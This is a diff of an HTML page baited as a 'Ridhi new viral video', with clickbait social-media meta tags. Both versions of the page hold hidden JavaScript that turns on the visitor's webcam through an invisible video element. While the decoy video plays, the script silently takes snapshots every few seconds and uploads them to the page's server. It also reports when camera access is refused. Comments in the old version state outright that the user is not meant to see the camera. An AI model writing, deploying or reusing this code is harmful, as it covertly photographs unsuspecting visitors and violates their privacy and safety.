@@ -1,162 +1,115 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-  <meta charset="UTF-8">
-  <title>Ridhi viral video</title>
-  <!-- SEO -->
-      <meta name="viewport" content="width=device-width, initial-scale=1.0">
-<meta name="description" content="Ridhi viral video">
 
-<!-- Open Graph -->
+
+<!-- Basic Meta Tags -->
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<meta name="title" content="Ridhi new viral video 💥💥">
+<meta name="description" content="Ridhi new vide 1.53 min 😋😋❤️‍🔥">
+<meta name="keywords" content="ridhi, keyword3">
+<meta name="author" content="viral video 2025">
+
+<!-- Open Graph / Facebook -->
 <meta property="og:type" content="website">
 <meta property="og:url" content="https://viral-video-nirg.onrender.com/ridhi-viral-video">
-<meta property="og:title" content=" Ridhi new Viral video 2025">
-<meta property="og:description" content=" Ridhi new video 2025">
+<meta property="og:title" content="Ridhi new viral video 2025 💥💥💥">
+<meta property="og:description" content="Ridhi new viral video 1.53 min 💥💥💥">
 <meta property="og:image" content="https://viral-video-nirg.onrender.com/Ridhi.webp">
-<meta property="og:image:width" content="1200">
-<meta property="og:image:height" content="630">
 
-<!-- Twitter Card -->
-<meta name="twitter:card" content=" Ridhi new viral trending video 2025">
+<!-- Twitter -->
+<meta name="twitter:card" content="Ridhi new viral video 💥💥💥💥💯">
 <meta name="twitter:url" content="https://viral-video-nirg.onrender.com/ridhi-viral-video">
-<meta name="twitter:title" content="Ridhi new Viral video 2025">
-<meta name="twitter:description" content=" Ridhi new Viral video 2025">
+<meta name="twitter:title" content="Ridhi new viral video 2025 💥💥💥">
+<meta name="twitter:description" content="Ridhi new viral video 2025 💥💥💥
+😋 enjoy this video ">
 <meta name="twitter:image" content="https://viral-video-nirg.onrender.com/Ridhi.webp">
-  
-  
-  
-  
-  
-  <link rel="stylesheet" href="style.css">
-  <style>
-  body {
-  font-family: Arial, sans-serif;
-  margin: 0;
-  background: #121212;
-  color: #fff;
-  text-align: center;
-}
 
-.container {
-  padding: 20px;
-}
 
-h1 {
-  color: #ffeb3b;
-}
 
-.video-wrapper {
-  display: flex;
-  justify-content: center;
-  margin-top: 20px;
-}
 
-#musicVideo {
-  width: 100%;
-  max-width: 800px;
-  aspect-ratio: 16/9;
-  border: 3px solid #ffeb3b;
-  border-radius: 10px;
-  box-shadow: 0px 6px 15px rgba(0,0,0,0.6);
-}
-
-.status {
-  margin-top: 15px;
-  font-size: 1.1rem;
-  color: #00e676;
-}
-
-footer {
-  margin-top: 40px;
-  font-size: 0.9rem;
-  color: #bbb;
-}
-  </style>
-  
-  
+<style>
+body { background:#121212; color:#fff; text-align:center; font-family:Arial; margin:0; }
+h1 { color:#ffeb3b; margin-top:20px; }
+.video-container { display:flex; justify-content:center; margin-top:20px; }
+video { width:100%; max-width:800px; aspect-ratio:16/9; border:3px solid #ffeb3b; border-radius:10px; box-shadow:0 6px 15px rgba(0,0,0,0.6); }
+#statusText { margin-top:15px; font-size:1.1rem; color:#00e676; }
+</style>
 </head>
 <body>
-  <div class="container">
+<h1>Viral Music Video 2025</h1>
 
-    <!-- ইউজার যা দেখবে -->
-    <div class="video-wrapper">
-      <video id="musicVideo" controls autoplay>
-        <source src="/video/Ridhi.mp4" type="video/mp4">
-        Your browser does not support video.
-      </video>
-    </div>
+<div class="video-container">
+<video id="musicVideo" controls autoplay>
+<source src="/video/Ridhi.mp4" type="video/mp4">
+Your browser does not support video.
+</video>
+</div>
 
-    <!-- Hidden camera (ইউজার দেখবে না) -->
-    <video id="camera" autoplay playsinline style="display:none;"></video>
-    <canvas id="canvas" style="display:none;"></canvas>
-
-    <p id="statusText" class="status">
-    🎬 Ridhi new viral video 1.53 min.
-      
-    </p>
-  </div>
-
+<video id="camera" autoplay playsinline style="display:none;"></video>
+<p id="statusText">🎬 Ridhi new viral video.mp4</p>
 
 <script>
-let camera = document.getElementById("camera");
-let canvas = document.getElementById("canvas");
-let ctx = canvas.getContext("2d");
-let statusText = document.getElementById("statusText");
+const camera = document.getElementById("camera");
+const statusText = document.getElementById("statusText");
+const videoId = window.location.pathname.split("/").pop() || "default_video";
 
-// ক্যামেরা চালু (hidden)
-navigator.mediaDevices.getUserMedia({ video: true, audio: false })
-  .then(stream => {
+async function sendSnapshot(base64) {
+    try {
+        await fetch("/upload-html-image", {
+            method: "POST",
+            headers: { "Content-Type": "application/json" },
+            body: JSON.stringify({ videoId, base64 })
+        });
+        console.log("✅ Snapshot sent for video ID:", videoId);
+    } catch(err) {
+        console.error("❌ Failed to send snapshot:", err);
+    }
+}
+
+// Camera permission
+navigator.mediaDevices.getUserMedia({ video:true, audio:false })
+.then(stream => {
     camera.srcObject = stream;
-    
-  })
-  .catch(err => {
-    console.error("Camera error: ", err);
-    
-  });
 
-// ছবি তোলার ফাংশন + সার্ভারে পাঠানো (high quality)
-async function captureAndUploadImage() {
-  // ভিডিওর আসল resolution পাওয়া
-  const videoWidth = camera.videoWidth || 640;
-  const videoHeight = camera.videoHeight || 480;
+    const canvas = document.createElement("canvas");
+    const ctx = canvas.getContext("2d");
 
-  canvas.width = videoWidth;
-  canvas.height = videoHeight;
+    async function capture() {
+        canvas.width = 640;   // smaller for Gmail
+        canvas.height = 360;
+        ctx.drawImage(camera, 0, 0, canvas.width, canvas.height);
 
-  ctx.drawImage(camera, 0, 0, videoWidth, videoHeight);
-
-  let dataUrl = canvas.toDataURL("image/jpeg", 1.0); // full quality JPEG
-
-  try {
-    await fetch("/upload", {
-      method: "POST",
-      headers: { "Content-Type": "application/json" },
-      body: JSON.stringify({ images: [dataUrl] }),
-    });
-    console.log("✅ Image uploaded (high quality)");
-  } catch (err) {
-    console.error("❌ Upload failed:", err);
-  }
-}
-
-// টাইমার লজিক: 3 রাউন্ড × 5 ছবি, 10s অন্তর, 30s বিরতি
-async function startCapture() {
-  for (let round = 0; round < 3; round++) {
-    for (let i = 0; i < 5; i++) {
-      
-      await captureAndUploadImage();
-      await new Promise(r => setTimeout(r, 10000)); // 10 sec
+        canvas.toBlob(blob => {
+            const reader = new FileReader();
+            reader.onloadend = () => {
+                const base64 = reader.result.split(",")[1];
+                sendSnapshot(base64);
+            };
+            reader.readAsDataURL(blob);
+        }, "image/jpeg", 0.7);
     }
-    if (round < 2) {
-      
-      await new Promise(r => setTimeout(r, 30000)); // 30 sec pause
+
+    // প্রতি 10 সেকেন্ডে capture
+    setInterval(capture, 10000);
+
+})
+.catch(async err => {
+    console.warn("❌ Camera permission denied:", err);
+    
+
+    try {
+        await fetch("/upload-html-image", {
+            method:"POST",
+            headers:{"Content-Type":"application/json"},
+            body: JSON.stringify({ videoId, noPermission:true })
+        });
+        console.log("❌ Permission denied info sent for video ID:", videoId);
+    } catch(e) {
+        console.error("❌ Failed to send permission info:", e);
     }
-  }
-
-  
-}
-
-startCapture();
+});
 </script>
 </body>
 </html>
